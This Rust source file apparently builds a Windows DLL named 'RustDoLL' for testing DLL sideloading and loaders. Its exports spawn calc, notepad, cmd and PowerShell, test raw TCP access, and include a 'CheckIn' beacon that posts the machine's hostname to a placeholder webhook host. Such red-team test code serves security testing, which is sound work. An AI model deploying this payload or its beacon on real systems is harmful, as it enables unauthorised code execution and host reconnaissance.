use std::process::Command;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use windows_sys::Win32::UI::WindowsAndMessaging::{MessageBoxW, MB_OK};

#[no_mangle]
pub extern "system" fn DllMain(_hinst_dll: u32, _fdw_reason: u32, _lpv_reserved: *mut std::ffi::c_void) -> i32 { 1 }

#[no_mangle]
pub extern "system" fn ExecuteCommand(command_ptr: *const u16) {
    if command_ptr.is_null() { return; }
    let cmd = unsafe {
        let mut len = 0;
        while *command_ptr.add(len) != 0 { len += 1; }
        String::from_utf16_lossy(std::slice::from_raw_parts(command_ptr, len))
    };

    match cmd.as_str() {
        "Calc" => { let _ = Command::new("calc.exe").spawn(); },
        "Cmd" => { let _ = Command::new("cmd.exe").spawn(); },
        "Powershell" => { let _ = Command::new("powershell.exe").spawn(); },
        "Notepad" => { let _ = Command::new("notepad.exe").spawn(); },
        "Popup" => { show_popup("RustDoLL", "Hello from RustDoll - loader test."); },
        "VisitUrl" => { visit_url_logic(); },
        "CheckIn" => { check_in_logic(); },
        "RunAll" => { 
            let _ = Command::new("calc.exe").spawn();
            let _ = Command::new("notepad.exe").spawn();
        },
        _ => {}
    }
}

// Standalone Exports
#[no_mangle] pub extern "system" fn Calc() { let _ = Command::new("calc.exe").spawn(); }
#[no_mangle] pub extern "system" fn Cmd() { let _ = Command::new("cmd.exe").spawn(); }
#[no_mangle] pub extern "system" fn Powershell() { let _ = Command::new("powershell.exe").spawn(); }
#[no_mangle] pub extern "system" fn Notepad() { let _ = Command::new("notepad.exe").spawn(); }
#[no_mangle] pub extern "system" fn Popup() { show_popup("RustDoLL", "Hello from RustDoll - standalone sideload test."); }
#[no_mangle] pub extern "system" fn VisitUrl() { visit_url_logic(); }
#[no_mangle] pub extern "system" fn CheckIn() { check_in_logic(); }
#[no_mangle] pub extern "system" fn RunAll() { 
    let _ = Command::new("calc.exe").spawn();
    let _ = Command::new("notepad.exe").spawn();
}

// Logic Helpers
fn visit_url_logic() {
    use std::net::TcpStream;
    // Simple TCP connection to verify raw socket access
    match TcpStream::connect("example.com:80") {
        Ok(_) => println!("[+] Raw TCP connection successful."),
        Err(e) => println!("[!] Raw TCP connection FAILED: {:?}", e),
    }
}

fn check_in_logic() {
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());
    let _ = reqwest::blocking::Client::new()
        .post("http://your-webhook-url.com")
        .body(format!("Host: {}", hostname))
        .send();
}

fn show_popup(title: &str, message: &str) {
    let t: Vec<u16> = OsStr::new(title).encode_wide().chain(std::iter::once(0)).collect();
    let m: Vec<u16> = OsStr::new(message).encode_wide().chain(std::iter::once(0)).collect();
    unsafe { MessageBoxW(std::ptr::null_mut(), m.as_ptr(), t.as_ptr(), MB_OK); }
}